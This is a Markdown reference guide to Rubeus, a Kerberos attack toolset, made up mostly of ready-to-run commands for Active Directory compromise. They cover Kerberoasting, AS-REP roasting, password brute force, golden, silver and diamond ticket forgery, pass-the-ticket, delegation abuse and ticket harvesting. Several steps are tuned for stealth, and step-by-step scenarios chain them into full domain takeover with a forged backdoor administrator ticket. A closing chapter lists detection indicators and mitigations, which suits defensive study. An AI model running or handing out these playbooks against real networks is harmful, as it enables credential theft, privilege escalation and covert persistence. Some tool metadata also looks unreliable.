---
tool_name: "rubeus"
display_name: "Rubeus"
mitre_tactic: "defense_evasion"
mitre_tactic_id: "TA0005"
mitre_subcategory: "pass_the_hash"
install_command: "sudo apt install rubeus"
version: "2.3.3"
github_repo: "https://github.com/GhostPack/Rubeus"
kali_tools_page: "https://www.kali.org/tools/rubeus/"
difficulty_level: "advanced"
requires_root: false
gui_available: false
tags: ["windows", "kerberos", "golden-ticket", "silver-ticket", "kerberoasting", "asreproast", "active-directory"]
related_tools: ["mimikatz", "impacket", "netexec", "crackmapexec"]
---

# Rubeus

## Chapter 1: Introduction & Overview

### What is Rubeus?

Rubeus is a C# toolset for raw Kerberos interaction and abuses. It implements the Kerberos protocol from scratch, allowing attackers to request, manipulate, forge, and inject Kerberos tickets for lateral movement and persistence. Rubeus is adapted from Benjamin Delpy's Kekeo project and Vincent LE TOUX's MakeMeEnterpriseAdmin.

### History & Background

- **Created:** 2016 by [harmj0y](https://twitter.com/harmj0y)
- **Maintained:** GhostPack (harmj0y, exploitph, Ceri Coburn)
- **License:** BSD 3-Clause
- **Platform:** Windows (.NET), runs on Kali via Mono or Windows targets
- **Dependencies:** .NET Framework 4.5+

### When to Use This Tool

- **Active Directory attacks:** Kerberoasting, AS-REP roasting, delegation abuse
- **Credential harvesting:** Extract Kerberos tickets from memory
- **Ticket forgery:** Golden tickets, silver tickets, diamond tickets
- **Lateral movement:** Overpass-the-Hash, Pass-the-Ticket
- **Persistence:** Long-lived forged tickets, skeleton key alternatives

### Key Concepts

- **TGT (Ticket-Granting-Ticket):** Proves identity to the KDC; used to request service tickets
- **TGS (Service Ticket):** Grants access to specific services
- **AS-REQ/AS-REP:** Authentication Service request/response; initial TGT acquisition
- **TGS-REQ/TGS-REP:** Ticket Granting Service request/response; service ticket acquisition
- **PAC (Privilege Attribute Certificate):** Contains user authorization data inside tickets
- **SPN (Service Principal Name):** Identifies services in Kerberos; target for Kerberoasting

---

## Chapter 2: Installation & Setup

### System Requirements

- **OS:** Windows (or Linux with Mono)
- **Runtime:** .NET Framework 4.5+
- **Privileges:** Normal user for most operations; elevated for some extraction

### Installation Methods

#### Method 1: APT (Precompiled on Kali)

```bash
sudo apt install rubeus
```

**Explanation:** Installs precompiled Rubeus.exe to `/usr/share/windows-resources/rubeus/`.

#### Method 2: From Source

```bash
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus
# Open Rubeus.sln in Visual Studio and build
# Or use msbuild:
dotnet build Rubeus.sln -c Release
```

**Explanation:** Compile from source for latest features. No precompiled binaries are officially released (intentionally, to avoid brittle AV signatures).

#### Method 3: Run on Kali

```bash
# Using Mono
mono /usr/share/windows-resources/rubeus/Rubeus.exe
```

### Verification

```bash
rubeus.exe 2>/dev/null || mono /usr/share/windows-resources/rubeus/Rubeus.exe
```

---

## Chapter 3: Basic Usage

### First Run

```bash
Rubeus.exe
```

**Explanation:** Displays full command reference and module list.

### Ticket Requests

#### Request TGT with Password

```bash
Rubeus.exe asktgt /user:administrator /password:Password123 /domain:target.example.com /dc:dc01.target.example.com /ptt
```
**Explanation:** Requests a TGT using plaintext password and applies to current logon session.

#### Request TGT with NTLM Hash

```bash
Rubeus.exe asktgt /user:administrator /rc4:b4b9b02e6f09a9bb312324d4b798e291 /domain:target.example.com /dc:dc01.target.example.com /ptt
```
**Explanation:** Overpass-the-Hash using NTLM hash to get a Kerberos TGT.

#### Request TGT with AES256 Key

```bash
Rubeus.exe asktgt /user:administrator /aes256:long_aes256_key_here /domain:target.example.com /dc:dc01.target.example.com /ptt
```
**Explanation:** Uses AES256 key for more stealthy TGT request (avoids RC4 downgrade detection).

#### Request TGT with Certificate (PKINIT)

```bash
Rubeus.exe asktgt /user:administrator /certificate:C:\temp\admin.pfx /password:PfxPassword /domain:target.example.com /dc:dc01.target.example.com /ptt
```
**Explanation:** Requests TGT using PKINIT with a PFX certificate.

#### Request TGT Without Preauth

```bash
Rubeus.exe asktgt /user:user_no_preauth /domain:target.example.com /dc:dc01.target.example.com /ptt
```
**Explanation:** Sends AS-REQ without preauthentication for accounts that don't require it.

#### Request TGT to New Logon Session

```bash
Rubeus.exe asktgt /user:administrator /rc4:hash /createnetonly:C:\Windows\System32\cmd.exe /show /domain:target.example.com
```
**Explanation:** Creates a sacrificial logon session with the TGT, launching cmd.exe under it. Avoids stomping current session's TGT.

### Service Ticket Requests

#### Request Service Ticket

```bash
Rubeus.exe asktgs /ticket:TGT_BASE64 /service:cifs/fileserver01.target.example.com /ptt
```
**Explanation:** Uses existing TGT to request a service ticket for CIFS.

#### Request Multiple Service Tickets

```bash
Rubeus.exe asktgs /ticket:TGT_BASE64 /service:cifs/server1,cifs/server2,ldap/server1 /ptt
```
**Explanation:** Requests service tickets for multiple SPNs simultaneously.

### Ticket Renewal

```bash
Rubeus.exe renew /ticket:ticket.kirbi /ptt
```
**Explanation:** Renews an existing ticket and applies it.

```bash
Rubeus.exe renew /ticket:ticket.kirbi /autorenew
```
**Explanation:** Auto-renews ticket until renew-till limit.

---

## Chapter 4: Kerberos Attacks

### Kerberoasting

```bash
Rubeus.exe kerberoast /outfile:hashes.txt
```
**Explanation:** Extracts service ticket hashes for offline cracking. Uses current user's TGT to request TGS for all SPNs.

```bash
Rubeus.exe kerberoast /user:svc_sql /outfile:hash.txt
```
**Explanation:** Kerberoast a specific service account.

```bash
Rubeus.exe kerberoast /spn:"MSSQLSvc/sqldb01.target.example.com" /outfile:hash.txt
```
**Explanation:** Kerberoast a specific SPN.

```bash
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```
**Explanation:** Opsec-safe Kerberoasting — filters out AES-only accounts, requests RC4 tickets.

```bash
Rubeus.exe kerberoast /usetgtdeleg /outfile:hashes.txt
```
**Explanation:** Uses tgtdeleg to request tickets, avoiding the need for current session TGT.

```bash
Rubeus.exe kerberoast /delay:5000 /jitter:30 /outfile:hashes.txt
```
**Explanation:** Kerberoast with 5-second delay and 30% jitter to avoid detection.

```bash
Rubeus.exe kerberoast /ldapfilter:"admincount=1" /outfile:hashes.txt
```
**Explanation:** Kerberoast only accounts with adminCount flag.

### AS-REP Roasting

```bash
Rubeus.exe asreproast /outfile:asrep_hashes.txt
```
**Explanation:** Finds and extracts hashes for accounts without Kerberos preauth.

```bash
Rubeus.exe asreproast /user:user_no_preauth /outfile:hash.txt
```
**Explanation:** AS-REP roast a specific user.

```bash
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
```
**Explanation:** Output in hashcat format for direct cracking.

### Password Brute Force

```bash
Rubeus.exe brute /passwords:passwords.txt /user:administrator /domain:target.example.com /dc:dc01.target.example.com
```
**Explanation:** Kerberos-based password brute force.

```bash
Rubeus.exe brute /passwords:passwords.txt /users:users.txt /creduser:DOMAIN\admin /credpassword:Password1 /domain:target.example.com
```
**Explanation:** Brute force with alternate credentials, testing against multiple users.

---

## Chapter 5: Ticket Forgery

### Golden Ticket

```bash
Rubeus.exe golden /rc4:b4b9b02e6f09a9bb312324d4b798e291 /user:administrator /domain:target.example.com /sid:S-1-5-21-3623811015-3361044348-30300820-1013 /ptt
```
**Explanation:** Forges a Golden Ticket using krbtgt NTLM hash. Grants access to any domain resource.

```bash
Rubeus.exe golden /rc4:hash /user:administrator /domain:target.example.com /sid:S-1-5-21-... /ldap /ptt
```
**Explanation:** Golden Ticket using LDAP to auto-gather PAC information.

```bash
Rubeus.exe golden /aes256:key /user:administrator /domain:target.example.com /sid:S-1-5-21-... /sids:S-1-5-21-...-519 /ptt
```
**Explanation:** Golden Ticket with Enterprise Admins extra SID for cross-domain access.

### Silver Ticket

```bash
Rubeus.exe silver /rc4:service_hash /user:administrator /service:cifs/fileserver01.target.example.com /domain:target.example.com /sid:S-1-5-21-... /ptt
```
**Explanation:** Forges Silver Ticket for CIFS service. No DC interaction needed after forgery.

```bash
Rubeus.exe silver /rc4:hash /user:administrator /service:http/dc01.target.example.com /domain:target.example.com /sid:S-1-5-21-... /ldap /ptt
```
**Explanation:** Silver Ticket for HTTP service with LDAP-derived PAC.

```bash
Rubeus.exe silver /rc4:hash /user:administrator /service:ldap/dc01.target.example.com /domain:target.example.com /sid:S-1-5-21-... /ldap /krbkey:krbtgt_hash /ptt
```
**Explanation:** Silver Ticket with KRBTGT key for proper KDC checksum.

### Diamond Ticket

```bash
Rubeus.exe diamond /user:administrator /rc4:hash /krbkey:krbtgt_hash /ticketuser:fake_admin /domain:target.example.com /dc:dc01.target.example.com /ptt
```
**Explanation:** Diamond Ticket — requests a real TGT then modifies the PAC with elevated privileges. Harder to detect than Golden Ticket because it uses a legitimate TGT.

---

## Chapter 6: Ticket Management

### Pass-the-Ticket

```bash
Rubeus.exe ptt /ticket:base64_ticket_data
```
**Explanation:** Injects a Kerberos ticket into current logon session.

```bash
Rubeus.exe ptt /ticket:ticket.kirbi /luid:0x3e7
```
**Explanation:** Injects ticket into a specific logon session (requires elevation).

### Ticket Inspection

```bash
Rubeus.exe describe /ticket:base64_ticket
```
**Explanation:** Parses and displays ticket details (encryption type, PAC info, SPN, etc.).

```bash
Rubeus.exe describe /ticket:ticket.kirbi /servicekey:hash /krbkey:hash
```
**Explanation:** Describes ticket with decryption keys for full PAC inspection.

### Ticket Purging

```bash
Rubeus.exe purge
```
**Explanation:** Purges all Kerberos tickets from current logon session.

```bash
Rubeus.exe purge /luid:0x3e7
```
**Explanation:** Purges tickets from a specific logon session.

### Ticket Extraction

```bash
Rubeus.exe triage
```
**Explanation:** Lists all current tickets with brief info.

```bash
Rubeus.exe klist
```
**Explanation:** Lists all current tickets with full detail.

```bash
Rubeus.exe dump /nowrap
```
**Explanation:** Dumps all tickets as base64. Use /nowrap for clean output.

```bash
Rubeus.exe dump /service:krbtgt
```
**Explanation:** Dumps only krbtgt service tickets.

```bash
Rubeus.exe tgtdeleg
```
**Explanation:** Retrieves a usable TGT for the current user without elevation by abusing Kerberos GSS-API delegation trick.

```bash
Rubeus.exe monitor /interval:30
```
**Explanation:** Monitors for new TGT requests every 30 seconds.

```bash
Rubeus.exe harvest /monitorinterval:60 /displayinterval:300
```
**Explanation:** Harvests and auto-renews TGTs, displaying cache every 5 minutes.

---

## Chapter 7: Advanced Usage

### Constrained Delegation Abuse (S4U)

```bash
Rubeus.exe s4u /user:svc_web /rc4:hash /impersonateuser:administrator /msdsspn:cifs/fileserver01.target.example.com /ptt
```
**Explanation:** S4U abuse — requests a service ticket on behalf of administrator using constrained delegation.

```bash
Rubeus.exe s4u /user:svc_web /rc4:hash /impersonateuser:administrator /msdsspn:cifs/fileserver01 /altservice:ldap,http,host /ptt
```
**Explanation:** S4U with alternate service names for broader access.

```bash
Rubeus.exe s4u /user:svc_web /rc4:hash /impersonateuser:administrator /msdsspn:cifs/fileserver01 /self /ptt
```
**Explanation:** S4U self — creates a ticket impersonating the service account itself.

```bash
Rubeus.exe s4u /user:svc_web /rc4:hash /impersonateuser:administrator /msdsspn:cifs/fileserver01 /bronzebit /ptt
```
**Explanation:** S4U with bronze bit — modifies delegation flags in PAC to bypass delegation restrictions.

### Cross-Domain S4U

```bash
Rubeus.exe s4u /user:svc_web /rc4:hash /domain:source.local /impersonateuser:administrator /msdsspn:cifs/fileserver01.target.local /targetdomain:target.local /targetdc:dc01.target.local /ptt
```
**Explanation:** S4U across domain/forest trust.

### Opsec Flags

```bash
Rubeus.exe asktgt /user:administrator /password:Password123 /opsec /domain:target.example.com /ptt
```
**Explanation:** Opsec mode — sends initial AS-REQ without preauth, uses AES256 only, mimics genuine Windows behavior.

```bash
Rubeus.exe kerberoast /aes /outfile:hashes.txt
```
**Explanation:** Request AES Kerberos tickets (more stealthy than RC4).

### Logon Session Operations

```bash
Rubeus.exe logonsession
```
**Explanation:** Lists current logon sessions.

```bash
Rubeus.exe currentluid
```
**Explanation:** Shows current logon session LUID.

```bash
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
**Explanation:** Creates a sacrificial logon session with random credentials.

### Password Operations

```bash
Rubeus.exe hash /password:Password123 /user:administrator /domain:target.example.com
```
**Explanation:** Generates RC4, AES128, AES256, and DES hashes from a plaintext password.

```bash
Rubeus.exe changepw /ticket:TGT_BASE64 /new:NewPassword123 /dc:dc01.target.example.com
```
**Explanation:** Changes a user's password using an existing TGT.

```bash
Rubeus.exe tgssub /ticket:service_ticket_base64 /altservice:cifs /ptt
```
**Explanation:** Substitutes the SPN in an existing service ticket (service ticket manipulation).

---

## Chapter 8: Real-World Scenarios

### Scenario 1: CTF Challenge

**Objective:** Compromise domain and get admin flag

**Steps:**
```bash
# 1. Kerberoast all accounts
Rubeus.exe kerberoast /outfile:hashes.txt

# 2. Crack hash offline
hashcat -m 13100 hashes.txt wordlist.txt

# 3. Use cracked hash for lateral movement
Rubeus.exe asktgt /user:svc_sql /rc4:cracked_hash /domain:target.example.com /ptt

# 4. Access target resource
dir \\fileserver01\C$\flag.txt
```

### Scenario 2: Penetration Test

**Objective:** Full domain persistence

**Steps:**
```bash
# 1. Dump krbtgt hash via DCSync (mimikatz or impacket)
lsadump::dcsync /user:target.example.com\krbtgt

# 2. Forge Golden Ticket
Rubeus.exe golden /rc4:krbtgt_hash /user:administrator /domain:target.example.com /sid:S-1-5-21-... /ptt

# 3. Verify access
dir \\dc01.target.example.com\C$

# 4. Create additional persistence
Rubeus.exe golden /rc4:krbtgt_hash /user:backdoor_admin /domain:target.example.com /sid:S-1-5-21-... /sids:S-1-5-21-...-519 /ptt
```

### Scenario 3: Red Team Operation

**Objective:** Covert domain compromise

**Steps:**
```bash
# 1. Request TGT without detection (opsec mode)
Rubeus.exe asktgt /user:compromised_user /rc4:hash /opsec /domain:target.example.com /createnetonly:C:\Windows\System32\cmd.exe /show

# 2. Kerberoast with jitter
Rubeus.exe kerberoast /delay:10000 /jitter:50 /outfile:hashes.txt

# 3. Harvest TGTs from compromised sessions
Rubeus.exe harvest /monitorinterval:120 /targetuser:administrator

# 4. Use Diamond Ticket for stealthy privilege escalation
Rubeus.exe diamond /user:low_priv_user /rc4:hash /krbkey:krbtgt_hash /ticketuser:admin_user /domain:target.example.com /ptt
```

---

## Chapter 9: Detection & Defense

### How Defenders Detect Rubeus

#### Network Indicators

```
# Raw Kerberos traffic (port 88) from non-lsass.exe process
# RC4-encrypted Kerberos exchanges in AES-capable environment (downgrade)
# Unusual AS-REQ patterns (e.g., no preauth requests)
# TGS requests with RC4 encryption for AES-only accounts
```

#### Host Indicators

```
# LsaCallAuthenticationPackage() API usage
# LsaRegisterLogonProcess() from non-LSASS process
# Abnormal .kirbi files on disk
# Base64 ticket blobs in process memory
```

### Mitigation Strategies

| Control | Implementation |
|---------|----------------|
| Disable RC4 | Set domain to AES-only: `Set-KrbEncryptionType` |
| Monitor Event 4768 | Alert on RC4 TGT requests in AES environments |
| Monitor Event 4769 | Alert on RC4 TGS requests |
| Restrict SPNs | Minimize service accounts with SPNs |
| Disable unconstrained delegation | Remove from all non-DC computers |
| Protected Users group | Add sensitive accounts to Protected Users |
| Credential Guard | Prevent ticket extraction from memory |

### Blue Team Response

1. **Enforce AES encryption** — Eliminate RC4 downgrade attacks
2. **Monitor Kerberos events** — Track Event 4768/4769 for anomalous encryption types
3. **Audit SPN assignments** — Minimize Kerberoastable accounts
4. **Implement delegation controls** — Restrict constrained delegation
5. **Use Protected Users group** — Limit ticket lifetime for sensitive accounts
6. **Enable Credential Guard** — Prevent memory-based ticket extraction

---

## Resources

### Official Documentation

- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [Rubeus Changelog](https://github.com/GhostPack/Rubeus/blob/master/CHANGELOG.md)

### Tutorials

- [Rubeus Guide - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-attacks/kerberos-abuse)
- [Abusing Microsoft Kerberos - SANS](https://www.sans.org/white-papers/abusing-microsoft-kerberos/)
- [Rubeus Cheat Sheet -ired.team](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/kerberos-abuse-with-rubeus)

### Related Tools

- **mimikatz:** Credential extraction and Kerberos operations
- **impacket:** Python Kerberos implementation
- **Kekeo:** Original Kerberos toolkit by Benjamin Delpy
- **Invoke-Kerberoast:** PowerShell Kerberoasting

### Practice Resources

- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [VulnHub](https://www.vulnhub.com/)
